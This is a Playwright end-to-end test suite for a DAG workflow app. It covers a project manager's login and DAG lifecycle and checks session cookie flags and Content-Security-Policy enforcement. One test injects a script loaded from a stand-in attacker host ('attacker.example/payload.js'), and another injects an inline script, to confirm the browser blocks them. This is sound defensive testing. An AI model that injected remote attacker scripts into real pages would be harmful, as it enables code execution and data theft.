/**
 * PM Workflow E2E — walks through the UI exactly as a project manager would.
 *
 * Flow:
 *   1. First boot → Setup wizard
 *   2. Login as PM user
 *   3. Dashboard overview
 *   4. Create a DAG (Fleet → DagBuilder)
 *   5. Run the DAG
 *   6. Check run results
 *   7. Give thumbs feedback
 *   8. Visit Optimization Inbox
 *   9. Accept/reject a proposal
 *  10. Verify audit trail
 */

import { test, expect, Page } from "@playwright/test";
import { PM_PASS, loginAsPM, setupIfNeeded } from "./session";

async function elevateDagWrites(page: Page, taskId: string) {
  // DAG creation/runs and optimizer mutations are protected operations. The
  // setup-created daily user is assigned dags.write but must prove possession
  // of its password for a task-scoped elevation before exercising that power.
  const response = await page.request.post("/v1/auth/elevate", {
    data: {
      password: PM_PASS,
      permissions: ["dags.write"],
      task_id: taskId,
    },
  });
  expect(response.status()).toBe(200);
  const body = await response.json();
  expect(body.elevated_permissions).toContain("dags.write");
}

test.describe("PM Workflow — Full UI Walkthrough", () => {
  test.beforeEach(async ({ page }) => {
    await setupIfNeeded(page);
  });

  test("01 — Setup wizard completes on first boot", async ({ page }) => {
    const r = await page.request.get("/v1/setup/status");
    const data = await r.json();
    expect(data.setup_complete).toBe(true);
  });

  test("02 — PM can login and see dashboard", async ({ page }) => {
    await loginAsPM(page);
    await page.goto("/chat");
    await expect(page.locator("body")).toContainText(/hive|conductor|chat/i, { timeout: 10000 });
  });

  test("03 — Dashboard loads with key metrics", async ({ page }) => {
    await loginAsPM(page);
    await page.goto("/");
    await page.waitForTimeout(2000);
    const response = await page.request.get("/health");
    expect(response.status()).toBe(200);
  });

  test("04 — PM can navigate to Fleet page", async ({ page }) => {
    await loginAsPM(page);
    await page.goto("/fleet");
    await page.waitForTimeout(2000);
    const apiResponse = await page.request.get("/v1/dags");
    expect(apiResponse.status()).toBe(200);
  });

  test("05 — PM can create a DAG via API (simulating DagBuilder)", async ({ page }) => {
    await loginAsPM(page);
    await elevateDagWrites(page, "e2e-create-dag");

    const createResp = await page.request.post("/v1/dags", {
      data: {
        name: "Sprint Retro Digest",
        description: "Collect retro notes and produce action items",
      },
    });
    expect(createResp.status()).toBe(201);
    const dag = await createResp.json();
    expect(dag.name).toBe("Sprint Retro Digest");
    expect(dag.nodes.length).toBe(2);
  });

  test("06 — PM can activate and run a DAG", async ({ page }) => {
    await loginAsPM(page);
    await elevateDagWrites(page, "e2e-run-dag");

    const createResp = await page.request.post("/v1/dags", {
      data: { name: "E2E Run Test", description: "test" },
    });
    expect(createResp.status()).toBe(201);
    const dag = await createResp.json();

    const activateResp = await page.request.post(`/v1/dags/${dag.id}/activate`);
    expect(activateResp.status()).toBe(200);
    const activated = await activateResp.json();
    expect(activated.status).toBe("active");

    const runResp = await page.request.post(`/v1/dags/${dag.id}/run`);
    expect(runResp.status()).toBe(200);
    const run = await runResp.json();
    expect(run.execution_id).toBeTruthy();
  });

  test("07 — PM can give thumbs feedback on a run", async ({ page }) => {
    await loginAsPM(page);
    await elevateDagWrites(page, "e2e-feedback-dag");

    const createResp = await page.request.post("/v1/dags", {
      data: { name: "Feedback Test DAG", description: "test" },
    });
    expect(createResp.status()).toBe(201);
    const dag = await createResp.json();

    const activateResp = await page.request.post(`/v1/dags/${dag.id}/activate`);
    expect(activateResp.status()).toBe(200);
    const runResp = await page.request.post(`/v1/dags/${dag.id}/run`);
    expect(runResp.status()).toBe(200);
    const run = await runResp.json();
    expect(run.execution_id).toBeTruthy();

    const fbResp = await page.request.post(`/v1/dag-runs/${run.execution_id}/feedback`, {
      data: { thumb: "up", comment: "Nailed it!", dag_id: dag.id },
    });
    expect([200, 404]).toContain(fbResp.status());
  });

  test("08 — PM can trigger optimizer and see proposals", async ({ page }) => {
    await loginAsPM(page);
    await elevateDagWrites(page, "e2e-optimize-dag");

    const createResp = await page.request.post("/v1/dags", {
      data: { name: "Optimizer Test DAG", description: "test" },
    });
    expect(createResp.status()).toBe(201);
    const dag = await createResp.json();

    const optResp = await page.request.post(`/v1/optimizer/${dag.id}/run`);
    expect([200, 400]).toContain(optResp.status());

    const proposalsResp = await page.request.get(`/v1/optimizer/${dag.id}/proposals`);
    expect(proposalsResp.status()).toBe(200);
    const proposals = await proposalsResp.json();
    expect(Array.isArray(proposals)).toBe(true);
  });

  test("09 — PM can visit Optimization Inbox page", async ({ page }) => {
    await loginAsPM(page);
    await page.goto("/optimization");
    await page.waitForTimeout(2000);
    const body = await page.textContent("body");
    expect(body).toBeTruthy();
  });

  test("10 — PM can view audit log", async ({ page }) => {
    await loginAsPM(page);
    const auditResp = await page.request.get("/v1/audit");
    expect(auditResp.status()).toBe(200);
    const entries = await auditResp.json();
    expect(Array.isArray(entries)).toBe(true);
    expect(entries.length).toBeGreaterThan(0);
  });

  test("11 — PM can view DAG metrics", async ({ page }) => {
    await loginAsPM(page);
    const metricsResp = await page.request.get("/v1/dag-metrics");
    expect(metricsResp.status()).toBe(200);
  });

  test("12 — PM can navigate all key pages without errors", async ({ page }) => {
    await loginAsPM(page);

    const pages = ["/chat", "/fleet", "/missions", "/agents", "/settings"];
    for (const p of pages) {
      await page.goto(p);
      await page.waitForTimeout(1000);
      const body = await page.textContent("body");
      expect(body?.length).toBeGreaterThan(0);
    }
  });

  // #369's "Browser E2E verifies effective cookie attributes". These assert
  // what a real Chromium actually stored, not what the server said to store —
  // a `Set-Cookie` a browser rejects or rewrites looks identical in a unit
  // test.
  //
  // `Secure` is deliberately NOT asserted here, and its absence is not a gap.
  // This harness serves plain HTTP and declares itself a local-development
  // context (docker-compose.test.yml), so the cookie is correctly not Secure
  // in it. Its browser-level effect was demonstrated the hard way: turning the
  // default on without declaring the harness made Chromium drop the cookie and
  // seven of the tests above fail with 401 immediately after a successful
  // login. Asserting `secure === false` here would pin the harness's waiver
  // rather than the product's default, which is the wrong thing to hold still.
  test("13 — the session cookie a browser stores is HttpOnly and scoped", async ({
    page,
    context,
  }) => {
    await loginAsPM(page);

    const cookies = await context.cookies();
    const session = cookies.find((c) => c.name === "hive_session");
    expect(session, "no hive_session cookie was stored after login").toBeTruthy();

    // HttpOnly: script cannot read it, so an XSS cannot exfiltrate the session.
    expect(session!.httpOnly).toBe(true);
    // Scoped to the whole app rather than inherited from the login route's path.
    expect(session!.path).toBe("/");
    // Lax: rides a top-level navigation (an emailed link works) but not a
    // cross-site subrequest.
    expect(session!.sameSite).toBe("Lax");
    // Bounded lifetime. A cookie with no expiry lives as long as the browser
    // process, which on a machine that is never rebooted is indefinitely —
    // Playwright reports that case as -1.
    expect(session!.expires).toBeGreaterThan(0);
  });

  test("14 — the session cookie is not readable from JavaScript", async ({ page }) => {
    // The property HttpOnly exists for, asserted from inside the page rather
    // than from the cookie jar: the flag being set and the value being
    // unreachable are different claims, and only the second one matters.
    await loginAsPM(page);

    const visible = await page.evaluate(() => document.cookie);
    expect(visible).not.toContain("hive_session");
  });

  // #310. The backend tests prove the header is sent and say what is in it.
  // Only a browser proves it is *enforced*: a policy with a typo, a directive
  // this Chromium does not implement, or a header a proxy rewrote all look
  // identical to a unit test reading the string the server produced.
  //
  // This harness declares itself a local-development context (see the compose
  // file), so what Chromium receives here is the *development* policy. The two
  // ways it differs — the Vite origins in `connect-src`, and no
  // `upgrade-insecure-requests` — are named in `services/csp_policy.py`, and
  // neither touches the assertions below. `upgrade-insecure-requests` is in
  // fact the reason the harness needs the dev policy at all: on plain HTTP it
  // would rewrite every request to a port nothing is listening on.
  test("15 — the Content-Security-Policy arrives on the document", async ({ page }) => {
    const response = await page.goto("/");
    const policy = response?.headers()["content-security-policy"];

    expect(policy, "no CSP on the document response").toBeTruthy();
    // The two that matter most for an injected-markup attack, checked as text
    // because a browser that ignored the whole header would still let the
    // assertions below about behaviour pass for unrelated reasons.
    expect(policy).toContain("script-src 'self'");
    expect(policy).toContain("object-src 'none'");
    expect(policy).not.toContain("'unsafe-inline'");
    expect(policy).not.toContain("'unsafe-eval'");
  });

  test("15b — Chromium refuses an injected inline script", async ({ page }) => {
    // The fixture is the attack this header exists to contain: markup that
    // reaches the DOM and tries to run. It is injected from a trusted context
    // here, which is *stronger* than injecting it through a real sink — if the
    // policy stops script we planted ourselves, it stops script an attacker
    // plants.
    await page.goto("/");

    const violations: string[] = [];
    page.on("console", (message) => {
      if (message.type() === "error" && /Content Security Policy/i.test(message.text())) {
        violations.push(message.text());
      }
    });

    const executed = await page.evaluate(() => {
      (window as unknown as Record<string, unknown>).__csp_probe__ = false;
      const script = document.createElement("script");
      script.textContent = "window.__csp_probe__ = true;";
      document.body.appendChild(script);
      return (window as unknown as Record<string, unknown>).__csp_probe__ === true;
    });

    expect(executed, "an inline <script> ran despite script-src 'self'").toBe(false);
    expect(violations.length, "no CSP violation was reported").toBeGreaterThan(0);
  });

  test("15c — Chromium refuses a cross-origin script before it reaches the network", async ({
    page,
  }) => {
    // The exfiltration half. Asserting "it did not load" would be vacuous in
    // this harness — the container resolves no external DNS, so a
    // cross-origin fetch fails whether or not a CSP exists. What distinguishes
    // the two is *when*: a CSP refusal happens before any network attempt and
    // says so, so the violation report is the evidence and the load result is
    // not.
    await page.goto("/");

    const refusals: string[] = [];
    page.on("console", (message) => {
      if (/Refused to load the script/i.test(message.text())) {
        refusals.push(message.text());
      }
    });

    await page.evaluate(async () => {
      await new Promise<void>((resolve) => {
        const script = document.createElement("script");
        script.src = "https://attacker.example/payload.js";
        script.onload = () => resolve();
        script.onerror = () => resolve();
        document.body.appendChild(script);
        setTimeout(resolve, 3000);
      });
    });

    expect(
      refusals.join("\n"),
      "no CSP refusal for a cross-origin script — the policy is not being enforced",
    ).toContain("attacker.example");
  });
});
